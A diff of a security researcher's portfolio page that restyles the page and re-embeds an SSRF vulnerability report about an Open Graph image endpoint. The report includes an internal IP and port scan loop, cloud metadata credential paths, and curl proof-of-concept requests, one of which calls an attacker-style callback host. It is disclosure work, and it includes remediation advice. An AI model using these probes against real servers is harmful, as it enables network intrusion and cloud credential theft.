@@ -109,7 +109,73 @@
     #contact a:hover{color:var(--accent)}
 
     footer{text-align:center;color:var(--muted);font-size:13px;padding:20px;margin-top:auto}
-  </style>
+
+  /* Report detail typography */
+  #report-detail h1, 
+  #report-detail h2, 
+  #report-detail h3 {
+    margin-top: 28px;
+    margin-bottom: 14px;
+    line-height: 1.3;
+    color: #fff;
+  }
+
+  #report-detail h1 { font-size: 28px; color: var(--accent); }
+  #report-detail h2 { font-size: 22px; color: #e6eef6; }
+  #report-detail h3 { font-size: 18px; color: #cfd6df; }
+
+  #report-detail p {
+    margin-bottom: 16px;
+    line-height: 1.6;
+    color: #cfd6df;
+  }
+
+  #report-detail ul {
+    margin: 12px 0 20px 20px;
+    color: #cfd6df;
+    line-height: 1.6;
+  }
+
+  #report-detail li { margin-bottom: 8px; }
+
+  /* Code blocks */
+  #report-detail pre {
+    background: #1a1f26;
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 8px;
+    padding: 14px;
+    overflow-x: auto;
+    margin: 16px 0;
+  }
+  #report-detail code {
+    font-family: "Fira Code", monospace;
+    font-size: 14px;
+    color: #efefef;
+  }
+
+  /* Inline code */
+  #report-detail p code, 
+  #report-detail li code {
+    background: rgba(255,255,255,0.08);
+    padding: 2px 5px;
+    border-radius: 4px;
+    font-size: 13px;
+  }
+
+  /* Blockquote */
+  #report-detail blockquote {
+    border-left: 4px solid var(--accent);
+    padding-left: 14px;
+    color: #9bb0c8;
+    margin: 18px 0;
+    font-style: italic;
+  }
+
+  /* Better spacing between sections */
+  #report-detail .post-content > * {
+    margin-bottom: 20px;
+  }
+</style>
 </head>
 <body>
   <aside id="sidebar">
@@ -180,58 +246,8 @@
 
     <section id="report-detail" aria-live="polite">
   <div style="max-width:900px;margin:0 auto;padding:20px;">
-    <h2 id="report-title">Report Title</h2>
-    <div id="report-body">
-      <p><strong>Summary:</strong> A server-side request forgery (SSRF) was discovered in an unauthenticated endpoint responsible for generating Open Graph images. The endpoint allowed arbitrary user-supplied URLs via the <code>image</code> GET parameter, which were fetched server-side and returned as a PNG. Due to the lack of input validation and network egress control, this resulted in a full SSRF primitive with deep internal reconnaissance capabilities.</p>
-
-      <h3>🧠 Core Behaviors</h3>
-      <ul>
-        <li>Arbitrary external/internal URL fetching (unauthenticated)</li>
-        <li>Followed HTTP redirects (302, 301)</li>
-        <li>Synchronous blocking — remote response delays impacted backend response time</li>
-        <li>Attacker-controlled content cached under application domain for 1 year</li>
-        <li>Access to <code>169.254.169.254</code> (Instance Metadata Service)</li>
-        <li><strong>Ability to scan internal IPs and discover open ports</strong></li>
-      </ul>
-
-      <h3>🔍 Internal Network Discovery</h3>
-      <pre><code>for ip in 10.0.0.1 to 10.0.0.255:
-  for port in [80,443,8080,8000,5000,3000]:
-    image = f"http://{ip}:{port}/favicon.ico"
-    response = GET /api/og/statistic?image={image}
-    if HTTP 200 or non-empty PNG:
-        log live host and port
-    elif delay > 5s:
-        mark as open|filtered</code></pre>
-
-      <h3>🧨 IMDS Access</h3>
-      <p>Direct access to the Instance Metadata Service (<code>169.254.169.254</code>) was confirmed:</p>
-      <ul>
-        <li><code>/latest/meta-data/</code> → 200 OK</li>
-        <li><code>/latest/meta-data/instance-id</code> → valid instance ID</li>
-        <li><code>/latest/meta-data/iam/security-credentials/</code> → accessible</li>
-      </ul>
-
-      <h3>🧪 PoC Examples</h3>
-      <pre><code>curl -i 'https://target/api/og/statistic?image=https://attacker.oast.pro/poc.png'</code></pre>
-      <pre><code>curl -i 'https://target/api/og/statistic?image=http://169.254.169.254/latest/meta-data/'</code></pre>
-
-      <h3>🎯 Impact</h3>
-      <ul>
-        <li><strong>Full SSRF</strong> with internal IP scan</li>
-        <li><strong>IMDS access</strong> → possible credential leak</li>
-        <li><strong>Persistent cache</strong> of attacker-controlled resources</li>
-        <li><strong>DoS</strong> via delayed responses</li>
-      </ul>
-
-      <h3>🛡 Recommended Remediation</h3>
-      <ul>
-        <li>Denylist/allowlist outbound requests</li>
-        <li>Block private IP ranges</li>
-        <li>Use async + timeouts</li>
-        <li>Enable IMDSv2</li>
-      </ul>
-    </div>
+    <h2 id="report-title"></h2>
+    <div id="report-body"></div>
   </div>
   <footer>© 2025 codenamevenom — All rights reserved</footer>
 </section>
@@ -331,11 +347,64 @@
   if(titleEl) titleEl.textContent = titleMap[id] || "Report";
 
   // SSRF: se il tuo HTML SSRF è già statico dentro #report-body, lascialo così
-  if(id === 'ssrf'){
-    // non sovrascrivere (se vuoi, qui puoi forzare l'overwrite)
-  }
+  else if (id === 'ssrf') {
+  if (!bodyEl) return false;
+  const reportHtml = `
+    <h1>SSRF — /api/og/statistic</h1>
+    <p><strong>Summary:</strong> A server-side request forgery (SSRF) was discovered in an unauthenticated endpoint responsible for generating Open Graph images. The endpoint allowed arbitrary user-supplied URLs via the <code>image</code> GET parameter, which were fetched server-side and returned as a PNG. Due to the lack of input validation and network egress control, this resulted in a full SSRF primitive with deep internal reconnaissance capabilities.</p>
 
-  // IDOR: iniettiamo il post completo (body only)
+    <h2>Core Behaviors</h2>
+    <ul>
+      <li>Arbitrary external/internal URL fetching (unauthenticated)</li>
+      <li>Followed HTTP redirects (302, 301)</li>
+      <li>Synchronous blocking — remote response delays impacted backend response time</li>
+      <li>Attacker-controlled content cached under application domain for 1 year</li>
+      <li>Access to <code>169.254.169.254</code> (Instance Metadata Service)</li>
+      <li><strong>Ability to scan internal IPs and discover open ports</strong></li>
+    </ul>
+
+    <h2>Internal Network Discovery</h2>
+    <pre><code>for ip in 10.0.0.1 to 10.0.0.255:
+  for port in [80,443,8080,8000,5000,3000]:
+    image = f"http://{ip}:{port}/favicon.ico"
+    response = GET /api/og/statistic?image={image}
+    if HTTP 200 or non-empty PNG:
+        log live host and port
+    elif delay > 5s:
+        mark as open|filtered</code></pre>
+
+    <h2>IMDS Access</h2>
+    <p>Direct access to the Instance Metadata Service (<code>169.254.169.254</code>) was confirmed:</p>
+    <ul>
+      <li><code>/latest/meta-data/</code> → 200 OK</li>
+      <li><code>/latest/meta-data/instance-id</code> → valid instance ID</li>
+      <li><code>/latest/meta-data/iam/security-credentials/</code> → accessible</li>
+    </ul>
+
+    <h2>PoC Examples</h2>
+    <pre><code>curl -i 'https://target/api/og/statistic?image=https://attacker.oast.pro/poc.png'</code></pre>
+    <pre><code>curl -i 'https://target/api/og/statistic?image=http://169.254.169.254/latest/meta-data/'</code></pre>
+
+    <h2>Impact</h2>
+    <ul>
+      <li><strong>Full SSRF</strong> with internal IP scan</li>
+      <li><strong>IMDS access</strong> → possible credential leak</li>
+      <li><strong>Persistent cache</strong> of attacker-controlled resources</li>
+      <li><strong>DoS</strong> via delayed responses</li>
+    </ul>
+
+    <h2>Recommended Remediation</h2>
+    <ul>
+      <li>Denylist/allowlist outbound requests</li>
+      <li>Block private IP ranges</li>
+      <li>Use async + timeouts</li>
+      <li>Enable IMDSv2</li>
+    </ul>
+  `;
+  safeInjectReport('report-body', reportHtml);
+}
+
+  
   else if (id === 'idor1') {
     if (!bodyEl) return false;
     const reportHtml = `
